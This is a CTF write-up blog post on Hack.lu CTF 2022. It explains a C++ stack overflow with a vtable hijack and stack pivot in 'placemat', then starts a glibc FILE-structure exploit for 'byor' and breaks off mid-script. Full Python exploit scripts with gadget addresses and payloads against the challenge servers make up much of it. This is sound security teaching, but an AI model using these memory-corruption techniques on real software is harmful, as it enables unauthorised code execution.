---
title: Hack.lu CTF 2022 Writeups
url: https://ptr-yudai.hatenablog.com/entry/2022/11/06/163123
source: CTFするぞ
date: 2022-11-07
fetch_date: 2025-10-03T21:52:05.645596
---

# Hack.lu CTF 2022 Writeups

[![CTFするぞ](https://cdn.image.st-hatena.com/image/square/994ee0e012cf90178bff014bfd99123c02a89b36/backend=imagemagick;height=128;version=1;width=128/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441)](https://ptr-yudai.hatenablog.com/)

[CTFするぞ](https://ptr-yudai.hatenablog.com/)

[読者になる](https://blog.hatena.ne.jp/ptr-yudai/ptr-yudai.hatenablog.com/subscribe?utm_medium=button&utm_campaign=subscribe_blog&utm_source=blogs_topright_button)

# [CTFするぞ](https://ptr-yudai.hatenablog.com/)

## CTF以外のことも書くよ

[2022-11-06](https://ptr-yudai.hatenablog.com/archive/2022/11/06)

# [Hack.lu CTF 2022 Writeups](https://ptr-yudai.hatenablog.com/entry/2022/11/06/163123)

[CTF](https://ptr-yudai.hatenablog.com/archive/category/CTF)
[Writeup](https://ptr-yudai.hatenablog.com/archive/category/Writeup)

I met [@keymoon](https://twitter.com/kymn_/) at CODEBLUE conference and impulsively decided to play a CTF with him.
There was Hack.lu CTF 2022 in that weekend and we played it as a team `weak_ptr<moon>`.
Surprisingly we stood 5th place🎉

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20221031/20221031145034.png)

It was a fun to play a CTF with him.
I solved some tasks during the CTF and I'm going to write the solution here.

* [[Pwn Pasta] placemat 🧄 (45 solves / 206 pts)](#Pwn-Pasta-placemat--45-solves--206-pts)
* [[Pwn Pasta] byor 🔥 (14 solves / 343 pts)](#Pwn-Pasta-byor--14-solves--343-pts)
* [[Pwn Pasta] Ordersystem 🌶️ (14 solves / 343 pts)](#Pwn-Pasta-Ordersystem-️-14-solves--343-pts)
* [[Reverse Risottos] FingerFood 🍼 (69 solves / 177 pts)](#Reverse-Risottos-FingerFood--69-solves--177-pts)
* [[Reverse Risottos] Cocktail Bar 🧄 (27 solves / 257 pts)](#Reverse-Risottos-Cocktail-Bar--27-solves--257-pts)
* [[Web Wraps] babyelectronV1 🍼 (21 solves / 289 pts)](#Web-Wraps-babyelectronV1--21-solves--289-pts)
* [[Web Wraps] babyelectronV2 🧄 (19 solves / 299 pts)](#Web-Wraps-babyelectronV2--19-solves--299-pts)
* [[Misc Muffins] Gitlub as a Service 🧄 (15 solves / 334 pts)](#Misc-Muffins-Gitlub-as-a-Service--15-solves--334-pts)

# [Pwn Pasta] placemat 🧄 (45 solves / 206 pts)

The program is a TicTacToe game.

```
1 Play
2 Rules
3 Exit
1

Do you want to play against a (b)ot or against a (h)uman? b
What's your name?
neko

    ▼
X  neko                            Astroboy  O

                   A   B   C

               1     │   │
                  ───┼───┼───
               2     │   │
                  ───┼───┼───
               3     │   │

neko, enter the position you want to play (e.g. A3):
```

The game is designed to print the flag when the user wins against the [bot](http://d.hatena.ne.jp/keyword/bot).

```
void Game::congratulate() const
{
...
    if (this->activePlayer == this->opponent)
        return;
...
    // Check if the loosing player is a bot
    if (typeid(*this->opponent) != typeid(Bot))
    {
        return;
    }
...
    // Recheck if the game has actually been won before handing out the redemption_code
    // Just to make sure nobody does anything nasty
    if (this->board.checkWinner() != Field::PLAYER)
    {
        printf("Wait a minute. You didn't win! Did you cheat?\n\n");
    }
    else
    {
        printf("The redemption code for your free dessert is: %s\n\n", redemption_code);
    }
...
```

The [bot](http://d.hatena.ne.jp/keyword/bot) is so strong that we can't win. We need to pwn it to get the flag.

Although the source code is pretty big, it's easy to spot the [vulnerability](http://d.hatena.ne.jp/keyword/vulnerability): buffer overflow.

```
void Human::requestName()
{
    printf("What's your name?\n");
    scanf("%s", this->name);
    util::readUntilNewline();
}
```

The class instance is allocated on the stack in `Game::startSingleplayer`.

```
void Game::startSingleplayer()
{
    Human human;
    Bot bot;
    human.requestName();
    bot.requestName();

    Game game(&human, &bot);
    game.play();
}
```

By checking it on [GDB](http://d.hatena.ne.jp/keyword/GDB), you'll notice that `bot` is located after the `human` intance, which can be overwritten by the buffer overflow.

The `Bot` class has some virtual methods. That is, we can overwrite the virtual method table.

```
class Bot : public Player
{
public:
    virtual void requestName();
    virtual Position takeTurn(Board &);
};
```

Also, the game instance is initialized after `human.requestName()` and `bot.requestName()`.
This game instance is located right after the [bot](http://d.hatena.ne.jp/keyword/bot) instance on the memory.

```
class Game
{
private:
    Player *player;
    Player *opponent;
    Player *activePlayer;
    Board board;
public:
...
};
```

The game instance has some pointers pointing to the stack.
We can leak these pointers because the player name will be printed in `Game::play` and we don't have a NULL character there thanks to the buffer overflow.

So, we have the stack address and vtable control.
I put a fake vtable on the stack and overwrote the vtable of [bot](http://d.hatena.ne.jp/keyword/bot) with that address.

After getting EIP control, I used the following gadget to pivot ESP.

```
lea esp, [ecx-4]
```

To win the game, I created a fake game instance on the stack and called `Game::congratulate`.

```
from ptrlib import *

elf = ELF("./placemat/placemat")
#sock = Process("./placemat/placemat")
sock = Socket("nc flu.xxx 11701")

sock.sendline("1")
sock.sendlineafter("? ", "h")

# Leak stack address
sock.sendlineafter("?", "A"*0x10)
sock.sendlineafter("?", "B"*0x20)
name = sock.recvregex("(.+), enter the position")[0]
if name == b'A'*0x10:
    # skip
    sock.sendlineafter(": ", "A1")
    name = sock.recvregex("(.+), enter the position")[0]

addr_stack = u32(name[20:24])
logger.info("player 1 @ " + hex(addr_stack))

# Quit game
sock.sendlineafter(": ", "A2")
sock.sendlineafter(": ", "A3")
sock.sendlineafter(": ", "B2")
sock.sendlineafter(": ", "B3")
sock.sendlineafter(": ", "C2")

# Overwrite vtable
rop_lea_esp_pecxM4 = 0x0804b226
rop_pop_ebp = 0x0804b6c0
addr_win = 0x0804AA96

sock.sendline("1")
sock.sendlineafter("? ", "h")

# stack pivot
vtable_human = 0x0804c364
vtable_bot = 0x0804c1ac
payload = flat([
    rop_lea_esp_pecxM4,
    vtable_bot,
    vtable_human,
    0,
    rop_pop_ebp,
    addr_stack + 4 - 0xc,
], map=p32)
assert is_scanf_safe(payload)
sock.sendlineafter("?", payload)

# fake game instance
payload = flat([
    addr_win,
    0,
    addr_stack + 0x60
], map=p32)
payload += b"A"*0x38
payload += flat([
    0xdeadbeef,
    addr_stack + 8,  # player 1
    addr_stack + 12, # player 2
    # board
    1, 1, 1,
    1, 1, 1,
    1, 1, 1,
], map=p32)
sock.sendlineafter("?", payload)

sock.sh()
```

# [Pwn Pasta] byor 🔥 (14 solves / 343 pts)

The source code was not distributed but the program is very simple.

```
if (read(0, stdout, 0xE0) != 0xE0) exit(-1);
stdout->_IO_wdata = calloc(1, 0xE8);
puts("Let's have a look...");
return 0;
```

We can overwrite the whole data of `stdout`. However, the version of libc is 2.35.

All the efforts to mitigate FILE structure exploit in vain and I knew several ways to exploit FILE structure.
I used `_IO_wfile_jumps`, a technique also known as House of [Apple](http://d.hatena.ne.jp/keyword/Apple) 2.
Although `_IO_wdata` is overwritten by calloc, we can still abuse `_IO_cleanup` in `exit`.

I chained `stdout` to a fake FILE structure overlapping with `stdout`, which will be cleaned up in `_IO_cleanup` and we can call `_IO_wfile_overflow`.

```
from ptrlib import *

libc = ELF("./libc.so.6")
#sock = Process("./byor")
sock = Socket("nc flu.xxx 11801")

libc_base = int(sock.recvlineafter(": "), 16) - libc.symbol("_IO_2_1_stdout_")
libc.set_base(libc_base)

addr_IO_wfile_jumps = libc_base + 0x2160c0
payload = flat([
    # flag, 0,
    0, 0, # _IO_read_end / _IO_read_base
    0, 1, 0, # _IO_write_base / _IO_write_ptr / _IO_write_end
    0, 0, # _IO_buf_base / _IO_buf_end
    0, 0, 0, 0, # _IO_save_base / _IO_backup_base / _IO_save_end / _markers
    libc.symbol("_IO_2...